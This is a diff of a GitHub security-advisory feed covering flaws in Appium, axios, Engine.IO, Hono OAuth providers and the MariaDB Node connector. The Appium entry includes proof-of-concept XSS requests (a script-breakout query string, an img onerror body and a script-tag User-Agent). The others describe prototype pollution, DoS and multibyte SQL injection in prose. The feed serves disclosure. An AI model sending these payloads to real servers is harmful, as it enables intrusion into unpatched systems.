+<p>Appium's base-driver mounts the built-in <code>/test/guinea-pig</code>, <code>/test/guinea-pig-scrollable</code> and <code>/test/guinea-pig-app-banner</code> routes <strong>unconditionally</strong> on every server. The handler reflects the <code>throwError</code> query param, the <code>comments</code> POST field, and the <code>User-Agent</code> request header into the returned HTML via <code>compileLodashTemplate</code>, which interpolates <code>&lt;%= expr %&gt;</code> as <code>String(expr)</code> with <strong>no HTML/JS escaping</strong>. This yields reflected XSS, and the <code>throwError</code> value is reflected <strong>inside a <code>&lt;script&gt;</code> block</strong>, giving arbitrary JavaScript execution on the server's origin. No authentication, no session, no driver and no plugin are required, and the default bind address is <code>0.0.0.0</code>.</p>
+<h2 id="details">Details</h2>
+<h3 id="affected">Affected</h3>
+<ul>
+<li><code>@appium/base-driver</code> <strong>10.6.0</strong> (with Appium server <strong>3.5.0</strong>); tested live.</li>
+<li>Template engine helper: <code>@appium/base-driver</code> <code>lib/utils.ts</code> <code>compileLodashTemplate</code>.</li>
+</ul>
+<h3 id="location-fileline">Location (file:line)</h3>
+<ul>
+<li>Routes mounted unconditionally: <code>base-driver/lib/express/server.ts:216-219</code>
+(<code>app.all('/test/guinea-pig', guineaPig)</code> etc.).</li>
+<li>Tainting: <code>base-driver/lib/express/static.ts:35-61</code> (<code>guineaPigTemplate</code>) —
+<code>throwError = String(req.params.throwError ?? req.query?.throwError)</code>, <code>params.comment = String(req.body.comments)</code>, <code>params.userAgent = req.headers['user-agent']</code>.</li>
+<li>Unescaped render: <code>base-driver/lib/utils.ts:67-83</code> (<code>compileLodashTemplate</code>)
+emits <code>&lt;%= expr %&gt;</code> as <code>String(${expr})</code> via <code>new Function(...)</code>, no escaping.</li>
+<li>Sinks (shipped templates): <code>base-driver/static/test/guinea-pig.html:11-12</code>
+(<code>throwError</code> inside <code>&lt;script&gt;</code>), <code>:50</code> (<code>comment</code>), <code>:87</code> (<code>userAgent</code>); same in <code>guinea-pig-scrollable.html</code> / <code>guinea-pig-app-banner.html</code>.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Requests:</p>
+<pre><code>GET /test/guinea-pig?throwError=x%27%2balert(document.domain)%2b%27
+POST /test/guinea-pig         (body: comments=&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;)
+GET  /test/guinea-pig         (header: User-Agent: &lt;script&gt;alert(7)&lt;/script&gt;)
+</code></pre>
+<img src="https://github.com/user-attachments/assets/f58e1dce-f3ad-43d3-b66e-1ff5efea3866" alt="image" height="276" width="973">
+
+
+<h3 id="impact">Impact</h3>
+<p>An attacker who can get a victim to open a crafted link (or auto-submit a form) to the Appium server executes arbitrary JavaScript on the server's origin. With default CORS <code>*</code> + no authentication, that JS can drive the WebDriver REST API and plugin endpoints. The endpoints are debug/test fixtures that should not be reachable on a production listener at all.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/appium/appium/security/advisories/GHSA-3wgp-x9p5-c7cc">https://github.com/appium/appium/security/advisories/GHSA-3wgp-x9p5-c7cc</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58191">https://nvd.nist.gov/vuln/detail/CVE-2026-58191</a></li>
+<li><a href="https://github.com/appium/appium/pull/22394">https://github.com/appium/appium/pull/22394</a></li>
+<li><a href="https://github.com/appium/appium/commit/d94a40af9f8040191ee7888571a1c9d5aec59f89">https://github.com/appium/appium/commit/d94a40af9f8040191ee7888571a1c9d5aec59f89</a></li>
+<li><a href="https://github.com/appium/appium/releases/tag/@appium/base-driver@10.7.0">https://github.com/appium/appium/releases/tag/@appium/base-driver@10.7.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-3wgp-x9p5-c7cc">https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-01T18:54:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning]]></title>
+        <id>https://github.com/advisories/GHSA-68jp-44vc-2x5h</id>
+        <link href="https://github.com/advisories/GHSA-68jp-44vc-2x5h"/>
+        <updated>2026-09-01T18:42:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-gcfj-64vw-6mp9. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios in a Node.js deployment using the HTTP adapter can route requests through an attacker-controlled proxy. axios hardens merged request configuration by creating a null-prototype object, but request interceptors run after the merge; a common immutable interceptor pattern such as {...config} or Object.assign({}, config) converts the hardened config back into a regular object. axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads config.proxy through the prototype chain. If an attacker can pollute Object.prototype.proxy, affected requests can be routed through an attacker-controlled proxy. For plaintext HTTP requests, the proxy can observe Authorization headers, Basic auth from config.auth, method, absolute URL, Host, and request body, and can return its own response. This does not establish browser impact or HTTPS header/body disclosure under normal TLS validation. Affected versions are &gt;=0.31.1 (fixed in 0.33.0) and &gt;=1.15.2 (fixed in 1.18.0).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9">https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67320">https://nvd.nist.gov/vuln/detail/CVE-2026-67320</a></li>
+<li><a href="https://github.com/axios/axios/commit/df53d7dd99b202fb194217abd127ae6a630e70dc">https://github.com/axios/axios/commit/df53d7dd99b202fb194217abd127ae6a630e70dc</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-node-http-adapter">https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-node-http-adapter</a></li>
+<li><a href="https://github.com/advisories/GHSA-68jp-44vc-2x5h">https://github.com/advisories/GHSA-68jp-44vc-2x5h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-68jp-44vc-2x5h</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-01T15:30:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Nested axios option objects can consume polluted prototype values]]></title>
+        <id>https://github.com/advisories/GHSA-9wx3-p993-35vp</id>
+        <link href="https://github.com/advisories/GHSA-9wx3-p993-35vp"/>
+        <updated>2026-09-01T18:41:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-7q8q-rj6j-mhjq. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios before 0.33.0 (and 1.x before 1.18.0) can consume inherited properties from nested request option objects when the JavaScript process's Object.prototype has already been polluted by another component. While the top-level merged config uses a null prototype, nested plain objects such as auth and paramsSerializer are cloned into ordinary objects and read without own-property checks. When an application passes placeholder nested objects such as auth: {} or paramsSerializer: {}, inherited username/password values can cause silent injection of an Authorization: Basic header, and inherited encode/serialize values can alter query-string serialization (full serializer replacement requires a function-valued pollution primitive). This is exploitable only in the presence of pre-existing prototype pollution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq">https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67319">https://nvd.nist.gov/vuln/detail/CVE-2026-67319</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-nested-option-objects">https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-nested-option-objects</a></li>
+<li><a href="https://github.com/advisories/GHSA-9wx3-p993-35vp">https://github.com/advisories/GHSA-9wx3-p993-35vp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9wx3-p993-35vp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-01T15:30:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Excessive recursion in formDataToJSON can cause denial of service]]></title>
+        <id>https://github.com/advisories/GHSA-fq2j-3j99-rx65</id>
+        <link href="https://github.com/advisories/GHSA-fq2j-3j99-rx65"/>
+        <updated>2026-09-01T18:40:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-42h9-826w-cgv3. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios versions 0.28.0 and later contain uncontrolled recursion in formDataToJSON when processing FormData field names with deeply nested bracket segments. Attackers can supply FormData with field names containing thousands of nested brackets to exhaust the JavaScript call stack and trigger RangeError, causing request failure or process termination in applications that do not handle the exception.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3">https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67313">https://nvd.nist.gov/vuln/detail/CVE-2026-67313</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formdatatojson">https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formdatatojson</a></li>
+<li><a href="https://github.com/advisories/GHSA-fq2j-3j99-rx65">https://github.com/advisories/GHSA-fq2j-3j99-rx65</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fq2j-3j99-rx65</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-01T15:30:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios]]></title>
+        <id>https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</id>
+        <link href="https://github.com/advisories/GHSA-6hqm-hm2v-3p2p"/>
+        <updated>2026-09-01T18:38:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-f4gw-2p7v-4548. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios versions 1.15.0 before 1.18.0 fail to recognize 0.0.0.0 as a loopback address in shouldBypassProxy.js, allowing requests to 0.0.0.0 to bypass NO_PROXY rules. Attackers can supply 0.0.0.0 URLs to route requests through configured proxies, potentially exposing local services when the proxy can reach the destination.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548">https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67315">https://nvd.nist.gov/vuln/detail/CVE-2026-67315</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-no-proxy-bypass-via">https://www.vulncheck.com/advisories/axios-before-no-proxy-bypass-via</a></li>
+<li><a href="https://github.com/advisories/GHSA-6hqm-hm2v-3p2p">https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-01T15:30:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Fetch adapter `ReadableStream` uploads bypass `maxBodyLength`]]></title>
+        <id>https://github.com/advisories/GHSA-39j5-w47m-2gmv</id>
+        <link href="https://github.com/advisories/GHSA-39j5-w47m-2gmv"/>
+        <updated>2026-09-01T18:37:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-jqh4-m9w3-8hp9. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios versions 1.7.0 before 1.18.0 fail to enforce maxBodyLength for WHATWG ReadableStream request bodies in the fetch adapter when Content-Length cannot be determined. Attackers can supply unknown-length stream data to bypass upload size limits and cause uncontrolled network egress or resource exhaustion.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9">https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67317">https://nvd.nist.gov/vuln/detail/CVE-2026-67317</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-readablestream">https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-readablestream</a></li>
+<li><a href="https://github.com/advisories/GHSA-39j5-w47m-2gmv">https://github.com/advisories/GHSA-39j5-w47m-2gmv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-39j5-w47m-2gmv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-01T15:30:27.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: HTTP/2 streamed uploads bypass `maxBodyLength`]]></title>
+        <id>https://github.com/advisories/GHSA-fqj3-h9pc-443h</id>
+        <link href="https://github.com/advisories/GHSA-fqj3-h9pc-443h"/>
+        <updated>2026-09-01T18:35:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-mwf2-3pr3-8698. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>axios versions &gt;=1.13.0 (Node.js HTTP adapter) fail to enforce the configured maxBodyLength limit on streamed request bodies when requests are sent with httpVersion: 2. Because Node's HTTP/2 request API does not honor the maxBodyLength option and axios's byte-counting stream wrapper is gated on maxRedirects === 0, an attacker who controls a stream passed to axios can cause the application to transmit outbound data exceeding the configured finite maxBodyLength. Impact is limited to resource consumption and policy bypass (excess egress, upstream quota consumption, limited availability); it does not enable code execution, credential disclosure, or request-destination control. Calls using the default maxBodyLength: -1 and browser adapters are not affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698">https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67318">https://nvd.nist.gov/vuln/detail/CVE-2026-67318</a></li>
+<li><a href="https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-http-2">https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-http-2</a></li>
+<li><a href="https://github.com/advisories/GHSA-fqj3-h9pc-443h">https://github.com/advisories/GHSA-fqj3-h9pc-443h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fqj3-h9pc-443h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-01T15:30:27.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[browserslist] Browserslist: Unbounded memory growth (no cache eviction) via distinct query results, leading to eventual OOM]]></title>
         <id>https://github.com/advisories/GHSA-c83g-rgw3-j3cx</id>
@@ -439,604 +1004,5 @@ unrelated commit — that guard was never applied to this function.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-08-31T22:10:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[engine.io] Socket.IO: Engine.IO WebTransport SID DoS]]></title>
-        <id>https://github.com/advisories/GHSA-gr94-w7qr-f4j3</id>
-        <link href="https://github.com/advisories/GHSA-gr94-w7qr-f4j3"/>
-        <updated>2026-08-31T21:28:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Engine.IO servers with <strong>WebTransport enabled</strong> are vulnerable to a remotely triggerable denial of service.</p>
-<p>A malicious unauthenticated client can send a crafted WebTransport upgrade request containing a specially chosen session ID, such as <code>__proto__</code>. Because the session ID lookup did not properly verify that the key was an own property of the clients object, the lookup could resolve to an inherited prototype property instead of a valid Engine.IO client.</p>
-<p>This can cause a <code>TypeError</code> during WebTransport upgrade handling. Since the failure occurs in an asynchronous context, it may result in an unhandled Promise rejection and terminate the Node.js process on affected Node.js versions/configurations.</p>
-<p>Successful exploitation can allow an unauthenticated remote attacker to crash the server process and cause denial of service. Under a process supervisor, repeated exploitation may cause crash loops.</p>
-<p>Affected configurations are limited to deployments where WebTransport support is enabled. WebTransport is not enabled by default.</p>
-<p>Affected versions:</p>
-<ul>
-<li><code>engine.io &gt;= 6.5.0 &lt; 6.6.7</code></li>
-</ul>
-<h2 id="patches">Patches</h2>
-<p>The issue was fixed in:</p>
-<ul>
-<li><strong>engine.io 6.6.7</strong></li>
-</ul>
-<p>Users should upgrade to <code>engine.io@6.6.7</code> or later.</p>
-<p>If using Socket.IO packages that depend on Engine.IO, users should update to a Socket.IO release that includes the patched Engine.IO version.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading immediately is not possible, affected users can mitigate the issue by disabling WebTransport support.</p>
-<p>WebTransport is opt-in, so servers should ensure that <code>webtransport</code> is not included in the enabled transports list.</p>
-<p>For example, use only the default HTTP long-polling and WebSocket transports:</p>
-<pre><code class="language-js">const engine = new Server({
-  transports: ["polling", "websocket"],
-});
-</code></pre>
-<p>Additional operational mitigations may include:</p>
-<ul>
-<li>Restricting access to WebTransport endpoints at the reverse proxy or HTTP/3 layer.</li>
-<li>Disabling HTTP/3/WebTransport support until the patched version can be deployed.</li>
-<li>Running the service under a supervisor as a partial availability mitigation, though this does not prevent repeated crash attempts.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li>Fix commit: <a href="https://github.com/socketio/socket.io/commit/1fa1f46cd420ac5b57bb4c04c959b58f3c79158c">https://github.com/socketio/socket.io/commit/1fa1f46cd420ac5b57bb4c04c959b58f3c79158c</a></li>
-<li>Engine.IO changelog entry for <code>6.6.7</code>: <a href="https://github.com/socketio/socket.io/blob/main/packages/engine.io/CHANGELOG.md#667-2026-04-27">https://github.com/socketio/socket.io/blob/main/packages/engine.io/CHANGELOG.md#667-2026-04-27</a></li>
-<li>Engine.IO package: <a href="https://www.npmjs.com/package/engine.io">https://www.npmjs.com/package/engine.io</a></li>
-<li>Socket.IO repository: <a href="https://github.com/socketio/socket.io">https://github.com/socketio/socket.io</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/socketio/socket.io/security/advisories/GHSA-gr94-w7qr-f4j3">https://github.com/socketio/socket.io/security/advisories/GHSA-gr94-w7qr-f4j3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59724">https://nvd.nist.gov/vuln/detail/CVE-2026-59724</a></li>
-<li><a href="https://github.com/socketio/socket.io/commit/1fa1f46cd420ac5b57bb4c04c959b58f3c79158c">https://github.com/socketio/socket.io/commit/1fa1f46cd420ac5b57bb4c04c959b58f3c79158c</a></li>
-<li><a href="https://github.com/socketio/socket.io/releases/tag/engine.io@6.6.7">https://github.com/socketio/socket.io/releases/tag/engine.io@6.6.7</a></li>
-<li><a href="https://github.com/advisories/GHSA-gr94-w7qr-f4j3">https://github.com/advisories/GHSA-gr94-w7qr-f4j3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gr94-w7qr-f4j3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-31T21:28:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hono/oauth-providers] @hono/oauth-providers: OAuth state check fails open on omitted state, enabling login CSRF and forced account linking]]></title>
-        <id>https://github.com/advisories/GHSA-fm3f-ch8h-qw8q</id>
-        <link href="https://github.com/advisories/GHSA-fm3f-ch8h-qw8q"/>
-        <updated>2026-08-31T20:30:51.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The built-in social login providers accept an OAuth callback even when the <code>state</code> value is absent on both sides, so the anti-CSRF check passes for a callback that never came from a genuine login attempt. This defeats the <code>state</code>-based CSRF protection under default usage.</p>
-<h3 id="details">Details</h3>
-<p>The <code>state</code> check treated two absent values as a match, so a callback that omits <code>state</code> — and for which no <code>state</code> was ever stored — was allowed to redeem the authorization code. Hono's <code>csrf()</code> middleware does not help: it only inspects form-style requests, while the OAuth callback is a top-level <code>GET</code> navigation it treats as safe.</p>
-<p>This affects the <code>google</code>, <code>github</code>, <code>facebook</code>, <code>discord</code>, <code>twitch</code>, <code>linkedin</code>, and <code>msentra</code> providers. The <code>x</code> (Twitter) provider is not exploitable due to its PKCE binding.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker can make a victim's browser complete an OAuth callback that binds the attacker's identity instead of the victim's, leading to login CSRF (the victim silently acts inside the attacker's account) or forced account linking (the attacker's identity is linked to the victim's account, enabling later sign-in as the victim). Affects applications using an affected provider on <code>@hono/oauth-providers</code> <code>0.8.5</code> or earlier.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/middleware/security/advisories/GHSA-fm3f-ch8h-qw8q">https://github.com/honojs/middleware/security/advisories/GHSA-fm3f-ch8h-qw8q</a></li>
-<li><a href="https://github.com/honojs/middleware/pull/2040">https://github.com/honojs/middleware/pull/2040</a></li>
-<li><a href="https://github.com/honojs/middleware/commit/b37765f40b7bddb1d8fce39573b085222dea58c1">https://github.com/honojs/middleware/commit/b37765f40b7bddb1d8fce39573b085222dea58c1</a></li>
-<li><a href="https://github.com/honojs/middleware/releases/tag/%40hono%2Foauth-providers%400.8.6">https://github.com/honojs/middleware/releases/tag/%40hono%2Foauth-providers%400.8.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-fm3f-ch8h-qw8q">https://github.com/advisories/GHSA-fm3f-ch8h-qw8q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fm3f-ch8h-qw8q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-31T20:30:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Deep formToJSON Key Recursion Can Cause Denial of Service]]></title>
-        <id>https://github.com/advisories/GHSA-4ww2-rjh2-xpv9</id>
-        <link href="https://github.com/advisories/GHSA-4ww2-rjh2-xpv9"/>
-        <updated>2026-08-31T20:02:57.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-pmv8-rq9r-6j72. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>axios versions from 0.28.0 before 0.33.0 and from 1.0.0 before 1.18.0 contain uncontrolled recursion in formDataToJSON (exposed as axios.formToJSON() and used internally when serializing FormData with Content-Type: application/json). When an application passes attacker-controlled FormData field names, a field name with thousands of nested bracket-delimited segments causes unbounded recursion in buildPath(), exhausting the JavaScript call stack (RangeError: Maximum call stack size exceeded) and causing denial of service for that request, or process termination in applications without appropriate error handling.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-pmv8-rq9r-6j72">https://github.com/axios/axios/security/advisories/GHSA-pmv8-rq9r-6j72</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67312">https://nvd.nist.gov/vuln/detail/CVE-2026-67312</a></li>
-<li><a href="https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formtojson">https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formtojson</a></li>
-<li><a href="https://github.com/advisories/GHSA-4ww2-rjh2-xpv9">https://github.com/advisories/GHSA-4ww2-rjh2-xpv9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4ww2-rjh2-xpv9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-01T15:30:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Prototype pollution gadgets can alter axios request construction]]></title>
-        <id>https://github.com/advisories/GHSA-f2r5-pqh9-r8f8</id>
-        <link href="https://github.com/advisories/GHSA-f2r5-pqh9-r8f8"/>
-        <updated>2026-08-31T19:51:22.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-mmx7-hfxf-jppx. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>axios is vulnerable to read-side prototype-pollution gadgets that can alter request construction when Object.prototype has already been polluted by a separate vulnerability or dependency. In the bodyless method aliases (axios.get(), axios.delete(), axios.head(), axios.options()), inherited data is read via (config || {}).data before config normalization, causing an attacker-controlled body to be sent on requests that did not set one. Additional low-level paths, only reachable when calling exported adapters/helpers (e.g. lib/adapters/http.js, unsafe/helpers/resolveConfig.js) directly with plain configs and no own proxy or paramsSerializer, can inherit polluted proxy values (routing requests through an attacker-controlled proxy) or paramsSerializer values (attacker-controlled URL serialization). These low-level gadgets do not reproduce through normal high-level axios calls on 1.15.2+. The issue is fixed in axios 1.18.0 and 0.33.0.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx">https://github.com/axios/axios/security/advisories/GHSA-mmx7-hfxf-jppx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67316">https://nvd.nist.gov/vuln/detail/CVE-2026-67316</a></li>
-<li><a href="https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-bodyless-methods">https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-bodyless-methods</a></li>
-<li><a href="https://github.com/advisories/GHSA-f2r5-pqh9-r8f8">https://github.com/advisories/GHSA-f2r5-pqh9-r8f8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f2r5-pqh9-r8f8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-01T15:30:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mariadb] MariaDB has  possible SQL injection in Buffer parameter escaping under big5/gbk/sjis/cp932/gb18030 client charsets]]></title>
-        <id>https://github.com/advisories/GHSA-g5xc-5w98-jfvm</id>
-        <link href="https://github.com/advisories/GHSA-g5xc-5w98-jfvm"/>
-        <updated>2026-08-28T22:53:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A SQL injection is possible when the connector escapes Buffer parameters client-side under a multi-byte client character set whose trail-byte range overlaps the ASCII backslash (0x5C): big5, gbk, sjis, cp932, and gb18030. Under these charsets, an attacker-controlled lead byte can absorb the escape byte the connector inserts, leaving the following quote unescaped so it terminates the string literal and injected SQL is parsed.</p>
-<h3 id="details">Details</h3>
-<p>When binding a Buffer (binary) parameter, the connector escapes the value byte-by-byte, inserting a backslash (0x5C) before quote (0x27) and backslash bytes. This is correct under single-byte and UTF-8–family charsets, but unsafe under client charsets whose multi-byte trail-byte range includes 0x5C.</p>
-<p>On the server, the SQL lexer performs multi-byte character recognition (my_ismbchar) before it interprets escape sequences. If character_set_client is one of the affected charsets and the attacker controls a byte the lexer treats as a valid lead byte, the sequence &lt;0x5C&gt; is consumed as a single multi-byte character. The escaping backslash inserted by the connector is swallowed as that character's trail byte, so the following 0x27 is no longer escaped — it closes the string literal, and the remaining bytes are parsed as SQL.</p>
-<p>This is the well-known multi-byte escaping bypass (the same class that historically affected addslashes / mysql_real_escape_string under GBK/Big5), here applied to the connector's client-side Buffer escaping path.</p>
-<h3 id="am-i-affected">Am I affected?</h3>
-<p>You are affected if all of the following hold:</p>
-<p>You use mariadb Connector/Node.js at a version below the patched releases listed below.
-The connection's client character set is one of big5, gbk, sjis, cp932, or gb18030. This is not the default (the default is utf8mb4).
-Untrusted data can reach a Buffer-typed query parameter.</p>
-<p>Applications using utf8mb4 (or any charset whose trail-byte range does not include 0x5C) are not affected by this vector. Parameters bound through the binary/server-side prepared-statement path are also not affected, because those values are sent out-of-band and are never escaped into the SQL text.</p>
-<h3 id="impact">Impact</h3>
-<p>SQL injection. An attacker able to influence the contents of a Buffer parameter can break out of the intended string literal and inject arbitrary SQL, leading to unauthorized read or modification of data and, depending on the database account's privileges, further compromise.</p>
